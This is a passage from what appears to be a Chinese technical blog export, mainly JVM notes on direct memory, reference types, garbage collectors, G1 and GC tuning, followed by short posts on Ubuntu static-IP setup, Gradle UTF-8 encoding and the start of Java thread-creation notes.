因为StringTable是由HashTable实现的，所以可以适当增加HashTable桶的个数，来减少字符串放入串池所需要的时间 1-XX:StringTableSize=xxxx 考虑是否需要将字符串对象入池 可以通过intern方法减少重复入池 6、直接内存 常见于NIO操作时，用于数据缓冲区 分配回收成本较高，但读写性能高 不受JVM内存回收管理 JVM常规文件IO流程(要调用“操作系统方法”操作IO) JVM直接内存文件IO流程(直接操作IO) 直接内存是操作系统和Java代码都可以访问的一块区域，无需将代码从系统内存复制到Java堆内存，从而提高了效率。 直接内存溢出：java.lang.OutOfMemoryError:Direct buffer memory 直接内存分配 123static int _1M = 1024 * 1024//通过ByteBuffer申请1M的直接内存ByteBuffer byteBuffer = ByteBuffer.allocateDirect(_1M); 直接内存释放 JVM并不能回收直接内存中的内容，它是如何实现回收的呢？看分析： 123456789101112131415161718import java.io.IOException;import java.nio.ByteBuffer;//直接内存示例//Windows上要通过任务管理器查看内存情况public class TestDemo &#123; static int _1G = 1024 * 1024 * 1024; public static void main(String[] args) throws IOException &#123; ByteBuffer byteBuffer = ByteBuffer.allocateDirect(_1G); System.out.println(\"分配直接内存完毕\"); System.in.read(); System.out.println(\"开始释放直接内存\"); byteBuffer = null; System.gc();//显示垃圾回收，Full GC System.in.read(); &#125;&#125; ByteBuffer.allocateDirect() 这个方法的实现是： 123456789101112131415161718192021/** * Allocates a new direct byte buffer. * * &lt;p&gt; The new buffer's position will be zero, its limit will be its * capacity, its mark will be undefined, each of its elements will be * initialized to zero, and its byte order will be * &#123;@link ByteOrder#BIG_ENDIAN BIG_ENDIAN&#125;. Whether or not it has a * &#123;@link #hasArray backing array&#125; is unspecified. * * @param capacity * The new buffer's capacity, in bytes * * @return The new byte buffer * * @throws IllegalArgumentException * If the &#123;@code capacity&#125; is a negative integer */public static ByteBuffer allocateDirect(int capacity) &#123; return new DirectByteBuffer(capacity);&#125; 而 DirectByteBuffer 类构造函数实现是： 12345678910111213141516171819202122232425262728293031// Primary constructor//DirectByteBuffer(int cap) &#123; // package-private super(-1, 0, cap, cap); boolean pa = VM.isDirectMemoryPageAligned(); int ps = Bits.pageSize(); long size = Math.max(1L, (long)cap + (pa ? ps : 0)); Bits.reserveMemory(size, cap); long base = 0; try &#123; //申请内存 base = UNSAFE.allocateMemory(size); &#125; catch (OutOfMemoryError x) &#123; Bits.unreserveMemory(size, cap); throw x; &#125; UNSAFE.setMemory(base, size, (byte) 0); if (pa &amp;&amp; (base % ps != 0)) &#123; // Round up to page boundary address = base + ps - (base &amp; (ps - 1)); &#125; else &#123; address = base; &#125; //Cleaner是虚引用类型 PhantomReference&lt;Object&gt; //特点：当所关联的对象被回收，Cleaner会触发clean()方法 //这里关联的是对象this就是DirectByteBuffer,当DirectByteBuffer被回收触发Cleaner.clean() cleaner = Cleaner.create(this, new Deallocator(base, size, cap)); att = null;&#125; 12345678910111213141516171819202122232425262728//Deallocator回调任务private static class Deallocator implements Runnable &#123; private long address; private long size; private int capacity; private Deallocator(long address, long size, int capacity) &#123; assert (address != 0); this.address = address; this.size = size; this.capacity = capacity; &#125; public void run() &#123; if (address == 0) &#123; // Paranoia return; &#125; //释放直接内存 UNSAFE.freeMemory(address); address = 0; Bits.unreserveMemory(size, capacity); &#125; &#125; Cleaner.clean()方法： 1234567891011121314151617181920/** * Runs this cleaner, if it has not been run before. */public void clean() &#123; if (!remove(this)) return; try &#123; //调用run方法，也就是上面的回调任务Deallocator.run()方法 thunk.run(); &#125; catch (final Throwable x) &#123; AccessController.doPrivileged(new PrivilegedAction&lt;&gt;() &#123; public Void run() &#123; if (System.err != null) new Error(\"Cleaner terminated abnormally\", x) .printStackTrace(); System.exit(1); return null; &#125;&#125;); &#125;&#125; 总结： 使用了 Unsafe 对象完成直接内存的分配回收，并且回收需要主动调用 Unsafe.freeMemory() 方法 ByteBuffer 的实现类内部，使用了Cleaner(虚引用)来监测 ByteBuffer 对象，ByteBuffer 对象被垃圾回收时会由 ReferenecHandler 后台线程通过Cleaner.clean()方法调用Unsafe.freeMemory()释放直接内存。 注意：-XX:+DisableExplicitGC 这个参数可以关闭 ”System.gc() 显式垃圾回收“ （在JVM调优会用），这样会导致以上分析的案例中，直接内存无法释放。 这种情况则需要自己主动通过 unsafe.freeMemory(address);来主动释放 上面这么复杂的直接内存分配和释放，其实就是Unsafe的两个方法，为了更加直观理解底层，请看一下示例: 1234567891011121314151617181920212223242526272829303132333435import sun.misc.Unsafe;import java.io.IOException;import java.lang.reflect.Field;public class TestDemo &#123; static int _1G = 1024 * 1024 * 1024; public static void main(String[] args) throws IOException &#123; Unsafe unsafe = getUnsafe(); long base = unsafe.allocateMemory(_1G); unsafe.setMemory(base,_1G,(byte)0); System.out.println(\"分配直接内存完毕\"); System.in.read(); System.out.println(\"开始释放直接内存\"); unsafe.freeMemory(base); System.in.read(); &#125; /** * 不建议这么获取并使用Unsafe，这里只是为了演示测试 * @return */ public static Unsafe getUnsafe() &#123; try &#123; Field f = Unsafe.class.getDeclaredField(\"theUnsafe\"); f.setAccessible(true); Unsafe unsafe = (Unsafe)f.get(null); return unsafe; &#125; catch (NoSuchFieldException | IllegalAccessException e) &#123; throw new RuntimeException(e); &#125; &#125;&#125; 三、垃圾回收Java 垃圾回收主要关注的是 堆内存 1、如何判断对象可以回收?1.1 引用计数法给对象添加一引用计数器，被引用一次计数器值就加 1；当引用失效时，计数器值就减 1；计数器为 0 时，对象就可以垃圾回收，简单高效。 弊端：循环引用时，两个对象的计数都为1，导致两个对象都无法被释放。所以Java虚拟机垃圾回收没有采用计数法。 1.2 可达性分析法 Java虚拟机中垃圾回收器采用可达性分析法来探索所有存活的对象 扫描“堆”中的对象，看是否能够沿着 GC Roots 对象为起点的引用链接找到该对象，找不到表示可以回收。 那些对象可以作为 GC Roots ？Menory Analyzer(MAT) 这个软件可以帮助分析。 虚拟机栈（栈帧中的本地变量表）中引用的对象。 方法区中类静态属性引用的对象 方法区中常量引用的对象 本地方法栈中JNI（Native方法）引用的对象 1.3 四种引用（强、软、弱、虚） JDK1.2 以前，一个对象只有被引用和没有被引用两种状态。后来，Java 对引用的概念进行了扩充，将引用分为强引用（Strong Reference）、软引用（Soft Reference）、弱引用（Weak Reference）、虚引用（Phantom Reference）4 种，这 4 种引用强度依次逐渐减弱。 强引用 指在程序代码之中普遍存在的，类似“Object obj = new Object()”这类的引用。 特点：只有 GC Root 全部都不引用该对象时，才会回收强引用对象。 如上图：B、C对象都不引用A1对象时，A1对象才会被回收。 软引用 指还有用但并非必需的对象，内存不足会回收，类似“SoftReference&lt;Object&gt; object = new SoftReference&lt;Object&gt;()”这类的引用。 特点：仅有软引用引用该对象时，发生垃圾回收后，如果仍然内存不足会再次触发“垃圾回收”回收软引用对象。 如上图：B对象 不再“强引用” A2对象，发生垃圾回收且内存不足时，G对象 “软引用”的 A2对象 就会被垃圾回收。 弱引用 和“软引用”很相似，区别在于：无论内存是否足够，都会被回收掉。类似“WeakReference&lt;Object&gt; object = new WeakReference&lt;Object&gt;()”这类的引用。 特点：发生垃圾回收时，无论内存是否充足，都会回收掉弱引用。 如上图: 如果 B对象 不再强引用 A3对象，只有C对象弱引用 A3对象，发生垃圾回收时，则A3对象会被回收。 虚引用 当虚引用对象所引用的对象被回收以后，虚引用对象就会被放入引用队列中，由Reference Handler 线程调用虚引用相关发发是否内存。声明“PhantomReference&lt;Object&gt;” 。 虚引用的一个体现是释放“直接内存”所分配的内存，当引用的对象ByteBuffer被垃圾回收以后，虚引用对象Cleaner就会被放入引用队列中，然后调用Cleaner的clean方法来释放直接内存。 虚引用是最弱的一种引用关系。 无法通过虚引用来取得一个对象实例 。为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。 终结器引用 所有的类都继承自Object类，Object类有一个finalize方法。当发生垃圾回收时，某个对象不再被其他的对象所引用时，会先将终结器引用对象放入引用队列中，然后根据终结器引用对象找到它所引用的对象，然后调用该对象的finalize方法。调用以后，该对象就可以在下一次垃圾回收发生时被回收。 特点： 无需手动编码，但其内部配合引用队列使用，在垃圾回收时，终结器引用入队(被引用对象暂时没有被回收)，再由Finalizer线程通过终结器引用找到引用对象并调用它的finalize方法，下次GC时才能回收被引用对象。 回收优先级低，不推荐使用终结器引用。 如上图：B对象不再引用A4对象。这时终结器引用对象就会被放入引用队列中（对象还没有被回收），引用队列会根据它，找到它所引用的对象A4，然后调用被引用对象的finalize方法，调用完成以后，该对象就可以在下次垃圾回收被回收。 示例 软引用示例： 清理软引用示例： 弱引用示例： 2、垃圾回收算法2.1 标记清除定义：标记清除算法顾名思义，是指在虚拟机执行垃圾回收的过程中，先采用标记算法确定可回收对象，然后垃圾收集器根据标识清除相应的内容，给堆内存腾出相应的空间。 优点：速度快 缺点：容易产生大量的内存碎片，可能无法满足大对象的内存分配，一旦导致无法分配对象，那就会导致JVM启动GC，一旦启动GC，我们的应用程序就会暂停，这就导致应用的响应速度变慢。 2.2 标记整理标记-整理 会将不被GC Root引用的对象回收，清楚其占用的内存空间。然后整理剩余的对象，可以有效避免因内存碎片而导致的问题，但是因为整体需要消耗一定的时间，所以效率较低。 优点：不会有内存碎片 缺点：速度慢 2.3 复制将内存分为大小相等的两个区域，FROM和TO（TO中为空）。先将被GC Root引用的对象从FROM放入TO中，再回收不被GC Root引用的对象。然后交换FROM和TO。 优点：不会有内存碎片 缺点：需要占用双倍内存空间 3、分代垃圾回收分为两大区：新生代和老年代。需长期存活的对象会存放在老年代区，很少发生垃圾回收；在新生代，垃圾回收发生频繁，处理生命周期比较短的对象。新生代也细分为三个区： 新生代 伊甸园（Eden） 幸存区（Survivor）From 幸存区（Survivor）To 老年代 新生代区发生的垃圾回收称为：Minor GC 新创建的对象默认存放在Eden区 当Eden区内存不足，会触发垃圾回收 Minor GC ，存活的对象会复制到 “幸存区To”。存活对象寿命加1，再交换幸存区（From - To）。 Minor GC 会引发 stop the world ，暂停其他用户线程，等垃圾回收结束，用户线程才恢复运行。 当Eden区再次内存不足，再触发垃圾回收 Minor GC ，Eden区存活对象复制到 “幸存区To”，并且回收 “幸存区From”，“幸存区From”存活对象也复制到“幸存区To”。存活对象寿命加1（原来“幸存区From”存活对象这时候寿命是 2 了），再交换幸存区（From - To）。 如果幸存区中的对象的寿命超过阈值，会晋升老年代，最大寿命是15(4bit）。 新生代和老年代中的内存都满了，就会先尝试触发 Minor GC ，如果空间扔不足，再触发Full GC， stop the world 时间更长。 GC分析总结 大对象处理策略 当遇到一个较大的对象时，就算新生代的伊甸园为空，也无法容纳该对象时，会将该对象直接晋升为老年代 线程内存溢出 某个线程的内存溢出了而抛异常（out of memory），不会让其他的线程结束运行这是因为当一个线程抛出OOM异常后，它所占据的内存资源会全部被释放掉，从而不会影响其他线程的运行，进程依然正常。 4、垃圾回收器 STW: Stop The World，Minor GC 会引发 Stop The World ，暂停其他用户线程，等垃圾回收结束，用户线程才恢复运行。 三种垃圾回收器概述和特点比较： 串行 单线程 堆内存较小，适合个人电脑 吞吐量优先 多线程 堆内存较大，多个CPU 让单位时间内，总的STW时间最短，如2次GC： 0.2 + 0.2 = 0.4 响应时间优先 多线程 堆内存较大，多个CPU 尽可能让单次STW的时间最短，如5次GC： 0.1 + 0.1 + 0.1 + 0.1 + 0.1 = 0.5 4.1 串行 因为是串行的，所以只有一个垃圾回收线程。且在该线程执行回收工作时，其他线程进入阻塞状态。 4.2 吞吐量优先并行执行，会暂停用户线程。 4.3 响应时间优先并发执行，不暂停用户线程，和用户线程并发执行（与用户线程抢CPU）。 基于标记-清除算法实现。并发收集、低停顿，但是会产生内存碎片。 4.4 G1 （Garbage First）G1是一个垃圾回收器， JDK7 由官方支持， JDK9 开始被默认使用的垃圾回收器（废弃了CMS垃圾回收器），适用场景： 同时注重吞吐量（Throughput）和低延迟（Low latency） 超大堆内存（内存大的），会将堆内存划分为多个 大小相等 的区域（Region） 整体上是 标记+整理 算法，两个区域（Region）之间是 复制 算法 相关的参数： 123-XX:+UseG1GC //开关，JDK8要手动开启-XX:G1HeapRegionSize=size-XX:MaxGCPauseMillis=time //默认200ms 4.4.1 G1垃圾回收阶段这是一个循环的过程 4.4.2 G1 Young Collection会STW E: 伊甸园区 S: 幸存区 O: 老年代 新生代伊甸园区 新生代垃圾回收：幸存对象 -&gt; 复制算法 -&gt; 幸存区 新生代垃圾回收：幸存区大龄对象 -&gt; 复制算法 -&gt; 老年代 4.4.3 G1 Young Collection + CM(并发标记) 在 Young GC 时会对 GC Root 进行初始标记 在老年代占用 堆内存的比例 达到阈值时，对进行并发标记（不会STW），由参数 -XX:InitiatingHeapOccupancyPercent=percent(默认45%) 4.4.4 G1 Mixed Collection (混合回收) 会对 E S O 进行全面的垃圾回收 最终标记 (Remark) 会STW 拷贝存活 (Evacuation) 会STW -XX:MaxGCPauseMills:ms 用于指定最长的停顿时间 问：为什么有的老年代被拷贝了，有的没拷贝？ 因为指定了最大停顿时间，如果对所有老年代都进行回收，耗时可能过高。为了保证时间不超过设定的停顿时间，会回收最有价值的老年代（回收后，能够得到更多内存） 4.4.5 Full GC SerialGC 新生代内存不足发生的垃圾回收 – minor gc 老年代内存不足发生的垃圾回收 – Full GC ParallelGC 新生代内存不足发生的垃圾回收 – minor gc 老年代内存不足发生的垃圾回收 – Full GC CMS 新生代内存不足发生的垃圾回收 – minor gc 老年代内存不足 G1 新生代内存不足发生的垃圾回收 – minor gc 老年代内存不足（老年代所占内存超过阈值） 如果垃圾产生速度慢于垃圾回收速度，不会触发Full GC，还是并发地进行清理 如果垃圾产生速度快于垃圾回收速度，便会触发Full GC 4.4.6 G1 Young Collection 跨代引用新生代回收的跨代引用（老年代引用新生代）问题 老年代区细分为多个卡表，如果某卡表中有对象引用了新生代的对象，那么这块区域标记为 脏卡。 卡表与Remembered Set Remembered Set 存在于E中，用于保存新生代对象对应的脏卡 脏卡：O被划分为多个区域（一个区域512K），如果该区域引用了新生代对象，则该区域被称为脏卡 在引用变更时通过post-write barried + dirty card queue （更新指令先放入脏卡队列） concurrent refinement threads 更新 Remembered Set （由一个线程完成更新脏卡的操作） 4.4.7 G1 Remark （重新标记） 黑色：已被处理，需要保留的 灰色：正在处理中的 白色：还未处理的 并发阶段标记时处理示例图： 并发下，下图中对C对象的处理可能受到用户线程的影响，比如： 标记前，“B对象”对“C对象”的引用被用户线程删除，这时“C对象”没有引用被标记为白色（垃圾），但标记尚未完成，“C对象”又被用户线程作为“A对象”的引用，但“C对象”已经被误标记为垃圾。 这种问题就要通过remark来解决。 重新标记阶段处理示意图： 当引用发生改变时，JVM给它加入一个写屏障 当A引用了C，就会给C加一个写屏障，写屏障的指令会被执行，指令执行的操作是将C放入一个队列（satb_mark_queue）当中，并将C变为 “处理中” 灰色状态 在并发标记阶段结束以后，进入重新标记阶段（会STW），然后将放在该队列中的对象重新处理，发现有强引用引用它，就不会垃圾回收它。 4.4.8 JDK 8u20字符串去重优点与缺点 节省了大量内存 新生代回收时间略微增加，导致略微多占用CPU 字符串去重 123456//开关-XX:+UseStringDeduplication//不同的对象，使用的是同一个char数组String s1 = new String(\"hello\"); // char[]&#123;'h','e','l','l','o'&#125;String s1 = new String(\"hello\"); // char[]&#123;'h','e','l','l','o'&#125; 将所有新分配的字符串（底层是char[]）放入一个队列 当新生代回收时，G1并发检查是否有重复的字符串 如果字符串的值一样，就让他们引用同一个字符串对象 注意，其与 String.intern() 的区别 String.intern()关注的是字符串对象 “字符串去重”关注的是char[] 在JVM内部，使用了不同的字符串表 4.4.9 JDK 8u40 并发标记类卸载 JDK 8u40在并发标记阶段结束以后，就能知道哪些类不再被使用。如果一个类加载器的所有类都不在使用，则卸载它所加载的所有类。 开关： 1-XX:+ClassUnloadingWithConcurrentMark 默认启用 4.4.10 JDK 8u60回收巨型对象 一个对象大于region的一半时，就称为巨型对象 G1不会对巨型对象进行拷贝 回收时被优先考虑 G1会跟踪老年代所有incoming引用，如果老年代incoming引用为0的巨型对象就可以在新生代垃圾回收时处理掉 4.4.11 JDK 9并发标记起始时间的调整 并发标记必须在堆空间占满前完成，否则退化为Full GC JDK9之前，需要使用 -XX:InitatingHeapOccupancyPercent 指定比例 JDK9可以动态调整此值 -XX:InitiatingHeapOccupancyPercent 用来设置初始值 JVM进行数据采样并动态调整 总会添加一个安全的空档空间 5、GC(垃圾回收)调优调优跟应用、环境等因素有关，需要根据经验做出调整。 查看Java虚拟机调优参数命令，具体命令可以看官网的文档说明。 1java -XX:+PrintFlagsFinal -version | findstr \"GC\" 示例： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116❯ java -XX:+PrintFlagsFinal -version | findstr \"GC\"java version \"11.0.1\" 2018-10-16 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.1+13-LTS)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.1+13-LTS, mixed mode) uintx AdaptiveSizeMajorGCDecayTimeScale = 10 &#123;product&#125; &#123;default&#125; bool BindGCTaskThreadsToCPUs = false &#123;product&#125; &#123;default&#125; uint ConcGCThreads = 1 &#123;product&#125; &#123;ergonomic&#125; bool DisableExplicitGC = false &#123;product&#125; &#123;default&#125; bool ExplicitGCInvokesConcurrent = false &#123;product&#125; &#123;default&#125; uintx G1MixedGCCountTarget = 8 &#123;product&#125; &#123;default&#125; uintx GCDrainStackTargetSize = 64 &#123;product&#125; &#123;ergonomic&#125; uintx GCHeapFreeLimit = 2 &#123;product&#125; &#123;default&#125; uintx GCLockerEdenExpansionPercent = 5 &#123;product&#125; &#123;default&#125; bool GCLockerInvokesConcurrent = false &#123;product&#125; &#123;default&#125; uintx GCPauseIntervalMillis = 201 &#123;product&#125; &#123;default&#125; uint GCTaskTimeStampEntries = 200 &#123;product&#125; &#123;default&#125; uintx GCTimeLimit = 98 &#123;product&#125; &#123;default&#125; uintx GCTimeRatio = 12 &#123;product&#125; &#123;default&#125; bool HeapDumpAfterFullGC = false &#123;manageable&#125; &#123;default&#125; bool HeapDumpBeforeFullGC = false &#123;manageable&#125; &#123;default&#125; size_t HeapSizePerGCThread = 43620760 &#123;product&#125; &#123;default&#125; uintx MaxGCMinorPauseMillis = 18446744073709551615 &#123;product&#125; &#123;default&#125; uintx MaxGCPauseMillis = 200 &#123;product&#125; &#123;default&#125; int ParGCArrayScanChunk = 50 &#123;product&#125; &#123;default&#125; uintx ParGCDesiredObjsFromOverflowList = 20 &#123;product&#125; &#123;default&#125; bool ParGCTrimOverflow = true &#123;product&#125; &#123;default&#125; bool ParGCUseLocalOverflow = false &#123;product&#125; &#123;default&#125; uintx ParallelGCBufferWastePct = 10 &#123;product&#125; &#123;default&#125; uint ParallelGCThreads = 4 &#123;product&#125; &#123;default&#125; bool PrintGC = false &#123;product&#125; &#123;default&#125; bool PrintGCDetails = false &#123;product&#125; &#123;default&#125; bool ScavengeBeforeFullGC = false &#123;product&#125; &#123;default&#125; bool UseAdaptiveGCBoundary = false &#123;product&#125; &#123;default&#125; bool UseAdaptiveSizeDecayMajorGCCost = true &#123;product&#125; &#123;default&#125; bool UseAdaptiveSizePolicyWithSystemGC = false &#123;product&#125; &#123;default&#125; bool UseConcMarkSweepGC = false &#123;product&#125; &#123;default&#125; bool UseDynamicNumberOfGCThreads = true &#123;product&#125; &#123;default&#125; bool UseG1GC = true &#123;product&#125; &#123;ergonomic&#125; bool UseGCOverheadLimit = true &#123;product&#125; &#123;default&#125; bool UseGCTaskAffinity = false &#123;product&#125; &#123;default&#125; bool UseMaximumCompactionOnSystemGC = true &#123;product&#125; &#123;default&#125; bool UseParallelGC = false &#123;product&#125; &#123;default&#125; bool UseParallelOldGC = false &#123;product&#125; &#123;default&#125; bool UseSerialGC = false &#123;product&#125; &#123;default&#125; ----------------------------------------------------$ \"C:\\Program Files\\Java\\jdk1.8.0_25\\bin\\java\" -XX:+PrintFlagsFinal -version | findstr \"GC\"java version \"1.8.0_181\"Java(TM) SE Runtime Environment (build 1.8.0_181-b13)Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode) uintx AdaptiveSizeMajorGCDecayTimeScale = 10 &#123;product&#125; uintx AutoGCSelectPauseMillis = 5000 &#123;product&#125; bool BindGCTaskThreadsToCPUs = false &#123;product&#125; uintx CMSFullGCsBeforeCompaction = 0 &#123;product&#125; uintx ConcGCThreads = 0 &#123;product&#125; bool DisableExplicitGC = false &#123;product&#125; bool ExplicitGCInvokesConcurrent = false &#123;product&#125; bool ExplicitGCInvokesConcurrentAndUnloadsClasses = false &#123;product&#125; uintx G1MixedGCCountTarget = 8 &#123;product&#125; uintx GCDrainStackTargetSize = 64 &#123;product&#125; uintx GCHeapFreeLimit = 2 &#123;product&#125; uintx GCLockerEdenExpansionPercent = 5 &#123;product&#125; bool GCLockerInvokesConcurrent = false &#123;product&#125; uintx GCLogFileSize = 8192 &#123;product&#125; uintx GCPauseIntervalMillis = 0 &#123;product&#125; uintx GCTaskTimeStampEntries = 200 &#123;product&#125; uintx GCTimeLimit = 98 &#123;product&#125; uintx GCTimeRatio = 99 &#123;product&#125; bool HeapDumpAfterFullGC = false &#123;manageable&#125; bool HeapDumpBeforeFullGC = false &#123;manageable&#125; uintx HeapSizePerGCThread = 87241520 &#123;product&#125; uintx MaxGCMinorPauseMillis = 4294967295 &#123;product&#125; uintx MaxGCPauseMillis = 4294967295 &#123;product&#125; uintx NumberOfGCLogFiles = 0 &#123;product&#125; intx ParGCArrayScanChunk = 50 &#123;product&#125; uintx ParGCDesiredObjsFromOverflowList = 20 &#123;product&#125; bool ParGCTrimOverflow = true &#123;product&#125; bool ParGCUseLocalOverflow = false &#123;product&#125; uintx ParallelGCBufferWastePct = 10 &#123;product&#125; uintx ParallelGCThreads = 4 &#123;product&#125; bool ParallelGCVerbose = false &#123;product&#125; bool PrintClassHistogramAfterFullGC = false &#123;manageable&#125; bool PrintClassHistogramBeforeFullGC = false &#123;manageable&#125; bool PrintGC = false &#123;manageable&#125; bool PrintGCApplicationConcurrentTime = false &#123;product&#125; bool PrintGCApplicationStoppedTime = false &#123;product&#125; bool PrintGCCause = true &#123;product&#125; bool PrintGCDateStamps = false &#123;manageable&#125; bool PrintGCDetails = false &#123;manageable&#125; bool PrintGCID = false &#123;manageable&#125; bool PrintGCTaskTimeStamps = false &#123;product&#125; bool PrintGCTimeStamps = false &#123;manageable&#125; bool PrintHeapAtGC = false &#123;product rw&#125; bool PrintHeapAtGCExtended = false &#123;product rw&#125; bool PrintJNIGCStalls = false &#123;product&#125; bool PrintParallelOldGCPhaseTimes = false &#123;product&#125; bool PrintReferenceGC = false &#123;product&#125; bool ScavengeBeforeFullGC = true &#123;product&#125; bool TraceDynamicGCThreads = false &#123;product&#125; bool TraceParallelOldGCTasks = false &#123;product&#125; bool UseAdaptiveGCBoundary = false &#123;product&#125; bool UseAdaptiveSizeDecayMajorGCCost = true &#123;product&#125; bool UseAdaptiveSizePolicyWithSystemGC = false &#123;product&#125; bool UseAutoGCSelectPolicy = false &#123;product&#125; bool UseConcMarkSweepGC = false &#123;product&#125; bool UseDynamicNumberOfGCThreads = false &#123;product&#125; bool UseG1GC = false &#123;product&#125; bool UseGCLogFileRotation = false &#123;product&#125; bool UseGCOverheadLimit = true &#123;product&#125; bool UseGCTaskAffinity = false &#123;product&#125; bool UseMaximumCompactionOnSystemGC = true &#123;product&#125; bool UseParNewGC = false &#123;product&#125; bool UseParallelGC := true &#123;product&#125; bool UseParallelOldGC = true &#123;product&#125; bool UseSerialGC = false &#123;product&#125; 5.1 调优领域 内存 锁竞争 CPU占用 IO GC 5.2 确定目标应用需要【低延迟】还是【高吞吐量】？情景举例： 示例1：科学运算应用追求【高吞吐量】，延迟时间影响不大，可以选择【高吞吐量】垃圾回收器ParallelGC。 示例2：互联网应用需要更快的响应时间，可以选择【低延迟】垃圾回收器。 选择合适的回收器： 【低延迟】垃圾回收器：CMS G1 ZGC 【高吞吐量】垃圾回收器：ParallelGC Zing GC 回收器自称零STW，可管理超大内存 5.3 最好的GC是不发生GC如果经常发生Full GC，首先应该检查代码问题，比如：查数据库把整张表的数据都拿出来了。 查看Full GC前后的内存占用，考虑以下几个问题 数据是不是太多？（select * from big_tables） 数据表示是否太臃肿 对象图 对象大小 是否存在内存泄漏 static Map map = new HashMap()作为缓存 一直往map防止对象而不移除，越积越多 可以用软、弱引用解决 或者Redis等第三方软件作为缓存 5.4 新生代调优新生代的特点 所有的new操作分配内存都是非常廉价的 TLAB： thread-local allocation buffer (线程局部分配缓冲区) TLAB的作用是让每个线程用私有的伊甸园区来分配new对象内存 死亡对象回收零代价 大部分对象用过即死（朝生夕死） Minor GC 所用时间远远小于 Full GC 新生代内存越大越好么？答案：不是！ 新生代内存太小：频繁触发Minor GC，会STW，会使得吞吐量下降 新生代内存太大：老年代内存占比有所降低，会更频繁地触发Full GC。而且触发Minor GC时，清理新生代所花费的时间会更长 新生代调优： Oracle建议新生代内存占堆大小的 25% ~ 50% ，-Xmn 参数设置新生代大小。 老师推荐：容纳所有【并发量 * ( 请求 - 响应 ) 】的数据为宜 幸存区调优： 幸存区大到能够保留【当前活跃对象 + 需要晋升的对象】 晋升阈值配置得当，让长时间存活的对象尽快晋升 5.5 老年代调优以CMS为例： CMS的老年代内存越大越好 先尝试不用调优，如果没有FullGC则不需要调优，有FullGC也先调优新生代 观察FullGC时老年代内存占用，调大老年代预设值 1/4 ~ 1/3 5.6 案例分析还是看视频吧","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"jvm","slug":"jvm","permalink":"http://yoursite.com/tags/jvm/"}]},{"title":"Ubuntu 18.04~20.04配置静态IP","slug":"Linux/Ubuntu 18.04配置静态IP","date":"2020-08-01T13:52:36.000Z","updated":"2022-01-18T02:55:14.399Z","comments":true,"path":"Linux/Ubuntu 18.04配置静态IP/","link":"","permalink":"http://yoursite.com/Linux/Ubuntu 18.04配置静态IP/","excerpt":"","text":"12345678910111213141516171819$ sudo vim /etc/netplan/50-cloud-init.yaml# This file is generated from information provided by# the datasource. Changes to it will not persist across an instance.# To disable cloud-init's network configuration capabilities, write a file# /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg with the following:# network: &#123;config: disabled&#125;network: ethernets: ens33: dhcp4: false addresses: [192.168.0.66/24] optional: true gateway4: 192.168.0.1 nameservers: addresses: [8.8.8.8,4.4.4.4] version: 2$ sudo netplan apply","categories":[{"name":"linux","slug":"linux","permalink":"http://yoursite.com/categories/linux/"}],"tags":[{"name":"Ubuntu","slug":"Ubuntu","permalink":"http://yoursite.com/tags/Ubuntu/"}]},{"title":"Gradle项目中文乱码","slug":"Java/Gradle项目中文乱码","date":"2020-08-01T01:52:36.000Z","updated":"2021-12-28T03:24:10.141Z","comments":true,"path":"Java/Gradle项目中文乱码/","link":"","permalink":"http://yoursite.com/Java/Gradle项目中文乱码/","excerpt":"","text":"在Windows下Idea新建的Gradle纯Java项目，运行和编译时一些中文信息总是乱码；最近Android Studio升级Gradle为 6.0+ ,编译时也会出现中文乱码，如果apk名称带有中文，在AS中debug运行直接报错（The application could not be installed. Installation failed due to: &#39;Invalid File:） 这里记录一下几种方法： 修改Idea全局设置 Help —&gt; Edit Custom VM Options -&gt; 输入： 1-Dfile.encoding=UTF-8 重启Idea，最好是 Invalidata Cacjes /Restart 在gradle.properties中加入 1-Dfile.encoding=UTF-8 在build.gradle加入 12345678910compileJava.options.encoding = 'UTF-8'compileTestJava.options.encoding = 'UTF-8'tasks.withType(JavaCompile)&#123; options.encoding =\"utf-8\"&#125;tasks.withType(Javadoc)&#123; options.encoding = \"utf-8\" options.charSet = \"utf-8\"&#125;","categories":[{"name":"Java","slug":"Java","permalink":"http://yoursite.com/categories/Java/"}],"tags":[{"name":"Gradle","slug":"Gradle","permalink":"http://yoursite.com/tags/Gradle/"}]},{"title":"思维导图整理Java并发基础","slug":"Java/思维导图整理Java并发基础","date":"2020-08-01T01:52:36.000Z","updated":"2021-12-28T03:24:10.153Z","comments":true,"path":"Java/思维导图整理Java并发基础/","link":"","permalink":"http://yoursite.com/Java/思维导图整理Java并发基础/","excerpt":"","text":"看到这篇文章《思维导图整理 Java 并发基础》写的很好，拷贝过来备忘。 这个文章作者的其他好文： 面试官问：“在项目中用过多线程吗？”你就把这个案例讲给他听！ 1、基本概念欲说线程，必先说进程。 进程：进程是代码在数据集合上的一次运行活动，是系统进行资源分配和调度的基本单位。 线程：线程是进程的一个执行路径，一个进程中至少有一个线程，进程中的多个线程共享进程的资源。 操作系统在分配资源时是把资源分配给进程的， 但是 CPU 资源比较特殊，它是被分配到线程的，因为真正要占用CPU运行的是线程，所以也说线程是 CPU分配的基本单位。 在Java中，当我们启动 main 函数其实就启动了一个JVM进程，而 main 函数在的线程就是这个进程中的一个线程，也称主线程。 示意图如下： 一个进程中有多个线程，多个线程共用进程的堆和方法区资源，但是每个线程有自己的程序计数器和栈。 2、线程创建和运行Java中创建线程有三种方式，分别为继承Thread类、实现Runnable接口、实现Callable接口。 继承Thread类，重写run()方法，调用start()方法启动线程 1234567891011121314151617public class ThreadTest &#123; /** * 继承Thread类 */ public static class MyThread extends Thread &#123; @Override public void run() &#123; System.out.println(\"This is child thread\"); &#125; &#125; public static void main(String[] args) &#123; MyThread thread = new MyThread(); thread.start(); &#125;&#125; 实现 Runnable 接口run()方法 12345678910public class RunnableTask implements Runnable &#123; public void run() &#123; System.out.println(\"Runnable!\"); &#125; public static void main(String[] args) &#123; RunnableTask task = new RunnableTask(); new Thread(task).start(); &#125;&#125; 上面两种都没有返回值。 实现Callable接口call()方法，这种方式可以通过FutureTask获取任务执行的返回值 123456789101112131415161718192021public class CallerTask implements Callable&lt;String&gt; &#123; public String call() throws 